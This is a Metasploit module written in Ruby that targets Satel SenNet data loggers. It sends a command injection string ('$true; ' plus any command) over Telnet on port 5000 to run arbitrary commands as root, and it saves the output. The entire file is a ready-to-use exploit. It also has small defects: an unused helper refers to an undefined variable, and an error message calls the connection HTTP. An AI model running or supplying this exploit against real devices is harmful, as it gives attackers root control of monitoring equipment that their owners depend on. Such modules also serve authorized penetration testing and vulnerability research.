##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Telnet
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Satel SenNet Data Logger Privileged Shell Arbitrary Command Execution Vulnerability',
      'Description' => %q{
        This module exploits an OS Command Injection vulnerability in Satel SenNet Data Loggers to perform arbitrary command execution as 'root'.
      },
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'DisclosureDate' => 'Apr 07, 2017',
      'License' => MSF_LICENSE,
      'DefaultOptions' => { 'VERBOSE' => true })
      )

    register_options(
      [
        Opt::RPORT(5000),
        OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30]),
        OptString.new('CMD', [true, 'Command(s) to run', 'id; pwd;'])
      ], self.class
    )

    deregister_options('USERNAME', 'PASSWORD')
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    to = (datastore['TIMEOUT'].zero?) ? 30 : datastore['TIMEOUT']
    begin
      ::Timeout.timeout(to) do
        command = datastore['CMD']
        inject = '$true; ' + "#{command}"
        res = connect

        print_status("Sending command now - #{command}")

        sock.puts(inject)
        data = sock.get_once(-1, 5)

        print_good("#{data}")

        loot_name = 'cmd-exec-log'
        loot_type = 'text/plain'
        loot_desc = 'Satel SenNet CMD Exec Dump'
        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc)
        print_good("File saved in: #{p}")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    ensure
      disconnect
    end
  end
end
